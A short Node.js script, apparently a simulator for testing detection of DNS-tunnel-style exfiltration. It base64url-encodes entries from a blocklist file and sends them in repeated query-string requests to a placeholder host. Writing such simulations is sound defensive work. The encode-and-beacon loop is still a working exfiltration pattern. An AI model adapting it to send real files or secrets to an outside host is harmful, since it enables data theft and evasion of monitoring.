const fs = require("fs");
const https = require("https");

const CONTROLLED = "https://example.com";

const indicators = fs
  .readFileSync("blocklist.txt", "utf8")
  .split("\n")
  .map((l) => l.trim())
  .filter(Boolean);

function encode(indicator, i) {
  return Buffer.from(`${indicator}-${Date.now()}-${i}`).toString("base64url");
}

function hit(label) {
  return new Promise((resolve) => {
    https.get(`${CONTROLLED}/?dns=${label}`, (res) => {
      res.on("data", () => {});
      res.on("end", resolve);
    }).on("error", resolve);
  });
}

(async () => {
  console.log("dns_tunnel_sim: start");
  let count = 0;

  for (const d of indicators) {
    for (let i = 0; i < 10; i++) {
      await hit(encode(d, i));
      await new Promise((r) => setTimeout(r, 90));
      count++;
    }
  }

  console.log("dns_tunnel_sim: complete hits =", count);
  process.exit(0);
})();

